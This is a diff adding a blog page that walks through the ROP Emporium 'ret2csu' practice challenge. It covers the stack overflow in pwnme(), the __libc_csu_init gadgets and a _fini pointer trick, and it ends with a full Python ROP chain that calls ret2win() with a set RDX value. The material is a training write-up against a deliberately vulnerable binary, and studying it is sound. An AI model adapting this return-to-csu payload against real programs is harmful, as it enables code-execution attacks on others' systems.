@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>08_ret2csu</title><!-- Begin Jekyll SEO tag v2.6.1 -->
+<meta name="generator" content="Jekyll v4.0.0" />
+<meta property="og:title" content="08_ret2csu" />
+<meta name="author" content="silma" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="ROP Emporium ret2csu" />
+<meta property="og:description" content="ROP Emporium ret2csu" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-07T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"08_ret2csu","dateModified":"2020-05-07T00:00:00+02:00","datePublished":"2020-05-07T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"/series/rop_emporium/ropemporium-ret2csu/"},"url":"/series/rop_emporium/ropemporium-ret2csu/","author":{"@type":"Person","name":"silma"},"description":"ROP Emporium ret2csu","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">/</a></li><li><a href="/writeups.html">writeups</a></li><li><a href="/series.html">series</a></li><li><a href="/cheatsheets.html">cheatsheets</a></li><li><a href="/about.html">about</a></li></ul>
+  </div>
+</header>
+<main>
+      <h1 id="rop-emporium-ret2csu">ROP Emporium ret2csu</h1>
+<p><br /></p>
+
+<p><strong>Tools:</strong> IDA Free 7.0, gdb-gef, ropper, readelf
+<strong>Prerequistes:</strong> Stack frame
+<strong>Download solution:</strong> <a href="/assets/series/rop_emporium/main.py">main.py</a></p>
+
+<h2 id="overview">Overview</h2>
+
+<blockquote>
+  <p>“The challenge is simple: call the ret2win() function, the caveat this time is that the third argument (which you know by now is stored in the rdx register on x86_64 Linux) must be 0xdeadcafebabebeef.”</p>
+</blockquote>
+
+<h2 id="function-pwnme">Function <em>pwnme()</em></h2>
+
+<p>As usual, the stack buffer expects an input of up to 0x20 bytes, but <em>_fget()</em> allows a much onger one:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x000000000040071C</span>    <span class="nv">lea</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">input_buffer</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400720</span>    <span class="nv">mov</span>     <span class="nb">edx</span><span class="p">,</span> <span class="mh">20h</span>        <span class="c1">; n</span>
+<span class="err">0</span><span class="nf">x0000000000400725</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">0</span>          <span class="c1">; c</span>
+<span class="err">0</span><span class="nf">x000000000040072A</span>    <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; s</span>
+<span class="err">0</span><span class="nf">x000000000040072D</span>    <span class="nv">call</span>    <span class="nv">_memset</span>
+<span class="err">[</span><span class="nf">...</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x0000000000400783</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nb">cs</span><span class="p">:</span><span class="nv">stdin@@GLIBC_2_2_5</span> <span class="c1">; stream</span>
+<span class="err">0</span><span class="nf">x000000000040078A</span>    <span class="nv">lea</span>     <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rbp</span><span class="o">+</span><span class="nv">input_buffer</span><span class="p">]</span>
+<span class="err">0</span><span class="nf">x000000000040078E</span>    <span class="nv">mov</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">0B0h</span>       <span class="c1">; n</span>
+<span class="err">0</span><span class="nf">x0000000000400793</span>    <span class="nv">mov</span>     <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rax</span>        <span class="c1">; s</span>
+<span class="err">0</span><span class="nf">x0000000000400796</span>    <span class="nv">call</span>    <span class="nv">_fgets</span>
+</code></pre></div></div>
+<p>In addition, the <em>.got.plt</em> entries are set to zero when not needed anymore (code not shown).</p>
+
+<h2 id="function-ret2win">Function <em>ret2win()</em></h2>
+
+<p>The aim is to call this function with <em>RDX</em> = 0xdeadcafebabebeef. This value will be xored with hardcoded data to decrypt the string “/bin/cat flag.txt” and call <em>_system()</em>. Automatic gadgets finder (I’m using <em>ropper</em>) doesn’t bring easy solutions such as <em>pop rdx</em> or <em>mov rdx, %</em>.
+However, author of the challenge gives us a <a href="https://i.blackhat.com/briefings/asia/2018/asia-18-Marco-return-to-csu-a-new-method-to-bypass-the-64-bit-Linux-ASLR-wp.pdf">cool reference</a> containing the roadmap to solve it.</p>
+
+<h2 id="function-__libc_csu_init">Function <em>__libc_csu_init()</em></h2>
+
+<p>This function is part of what authors of the paper linked above call “attached code”: code that is automatically added to the application by the linker. It has indeed 2 useful gadgets, a “mov gadget” and a “pop gadget”:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x0000000000400880</span>    <span class="nv">mov</span>     <span class="nb">rdx</span><span class="p">,</span> <span class="nv">r15</span>
+<span class="err">0</span><span class="nf">x0000000000400883</span>    <span class="nv">mov</span>     <span class="nb">rsi</span><span class="p">,</span> <span class="nv">r14</span>
+<span class="err">0</span><span class="nf">x0000000000400886</span>    <span class="nv">mov</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">r13d</span>
+<span class="err">0</span><span class="nf">x0000000000400889</span>    <span class="nv">call</span>    <span class="kt">qword</span> <span class="nv">ptr</span> <span class="p">[</span><span class="nv">r12</span><span class="o">+</span><span class="nb">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
+</code></pre></div></div>
+<p>And:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">0</span><span class="nf">x000000000040089A</span>    <span class="nv">pop</span>     <span class="nb">rbx</span>
+<span class="err">0</span><span class="nf">x000000000040089B</span>    <span class="nv">pop</span>     <span class="nb">rbp</span>
+<span class="err">0</span><span class="nf">x000000000040089C</span>    <span class="nv">pop</span>     <span class="nv">r12</span>
+<span class="err">0</span><span class="nf">x000000000040089E</span>    <span class="nv">pop</span>     <span class="nv">r13</span>
+<span class="err">0</span><span class="nf">x00000000004008A0</span>    <span class="nv">pop</span>     <span class="nv">r14</span>
+<span class="err">0</span><span class="nf">x00000000004008A2</span>    <span class="nv">pop</span>     <span class="nv">r15</span>
+<span class="err">0</span><span class="nf">x00000000004008A4</span>    <span class="nv">retn</span>
+</code></pre></div></div>
+<p>So, instructions <em>pop r15</em> and <em>mov rdx, r15</em> allow to set <em>RDX</em> to the required value. All we need now is finding a way to call <em>ret2win()</em>.</p>
+
+<h2 id="calling-ret2win">Calling <em>ret2win()</em></h2>
+
+<p>The instruction <em>call qword ptr [r12+rbx*8]</em> will be executed, but no easy arbitrary write could be found. Same result for an eventual table of pointers containing the address of <em>ret2win()</em>. After some wandering and googling, the <em>.dynamic</em> section contains a pointer to a “do nothing” function:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LOAD:0000000000600E20 _DYNAMIC    Elf64_Dyn &lt;1, 1&gt;
+LOAD:0000000000600E20             ; DT_NEEDED libc.so.6
+LOAD:0000000000600E30             Elf64_Dyn &lt;0Ch, 400560h&gt; ; DT_INIT
+LOAD:0000000000600E40             Elf64_Dyn &lt;0Dh, 4008B4h&gt; ; DT_FINI
+[...]
+</code></pre></div></div>
+<p>And the code contained inside the <em>.fini</em> section:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">.fini:</span><span class="err">00000000004008</span><span class="nf">B4</span>    <span class="nv">sub</span>     <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span>          <span class="c1">; _fini</span>
+<span class="nl">.fini:</span><span class="err">00000000004008</span><span class="nf">B8</span>    <span class="nv">add</span>     <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span>
+<span class="nl">.fini:</span><span class="err">00000000004008</span><span class="nf">BC</span>    <span class="nv">retn</span>
+</code></pre></div></div>
+<p>So, if <em>RBX</em> = 0 and <em>R12</em> = 0x600e48 we can <em>call 4008B4h</em>. Returning from this call, we land here:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">; above is the "mov gadget"</span>
+<span class="err">0</span><span class="nf">x000000000040088D</span>    <span class="nv">add</span>     <span class="nb">rbx</span><span class="p">,</span> <span class="mi">1</span>
+<span class="err">0</span><span class="nf">x0000000000400891</span>    <span class="nv">cmp</span>     <span class="nb">rbp</span><span class="p">,</span> <span class="nb">rbx</span>
+<span class="err">0</span><span class="nf">x0000000000400894</span>    <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_400880</span>
+<span class="err">0</span><span class="nf">x0000000000400896</span>
+<span class="err">0</span><span class="nf">x0000000000400896</span> <span class="nv">loc_400896</span><span class="p">:</span> 
+<span class="err">0</span><span class="nf">x0000000000400896</span>    <span class="nv">add</span>     <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span>
+<span class="c1">; below is the "pop gadget"</span>
+</code></pre></div></div>
+<p>We need to avoid the conditional jump, so <em>RBP</em> should be set to 1 during the first execution of the “pop” gadget. Then, we can return to <em>ret2win()</em> and enjoy having solved all of the ROP Emporium challenges.</p>
+
+<h2 id="rop-chain">ROP chain</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">payload</span> <span class="o">=</span> <span class="n">b</span><span class="s">''</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x41\x41\x41\x41\x41\x41\x41\x41</span><span class="s">'</span>  <span class="c1"># fill buffer
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x42\x42\x42\x42\x42\x42\x42\x42</span><span class="s">'</span>  <span class="c1"># overwrite RBP
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x9a\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># gadget 1
+</span>
+<span class="c1"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
+# rbp is set to 1 because of the future add rbx, 1; cmp rbp, rbx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop rbx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x01\x00\x00\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x48\x0e\x60\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># pop r12 (ptr .fini)
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x43\x43\x43\x43\x43\x43\x43\x43</span><span class="s">'</span>  <span class="c1"># pop r13
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x44\x44\x44\x44\x44\x44\x44\x44</span><span class="s">'</span>  <span class="c1"># pop r14
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xef\xbe\xbe\xba\xfe\xca\xad\xde</span><span class="s">'</span>  <span class="c1"># pop r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x80\x08\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># gadget 2
+</span>
+<span class="c1"># mov rdx, r15; mov rsi, r14; mov edi, r13d; ; call _fini
+# + second exec of "gadget 1", but with an add rsp, 8
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x45\x45\x45\x45\x45\x45\x45\x45</span><span class="s">'</span>  <span class="c1"># add rsp, 8
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x46\x46\x46\x46\x46\x46\x46\x46</span><span class="s">'</span>  <span class="c1"># pop rbx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x47\x47\x47\x47\x47\x47\x47\x47</span><span class="s">'</span>  <span class="c1"># pop rbp
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x48\x48\x48\x48\x48\x48\x48\x48</span><span class="s">'</span>  <span class="c1"># pop r12
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x49\x49\x49\x49\x49\x49\x49\x49</span><span class="s">'</span>  <span class="c1"># pop r13
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a</span><span class="s">'</span>  <span class="c1"># pop r14
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\x4b\x4b\x4b\x4b\x4b\x4b\x4b\x4b</span><span class="s">'</span>  <span class="c1"># pop r15
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">b</span><span class="s">'</span><span class="se">\xb1\x07\x40\x00\x00\x00\x00\x00</span><span class="s">'</span>  <span class="c1"># ret2win()
+</span></code></pre></div></div>
+<hr />
+<p>End of file</p>
+
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
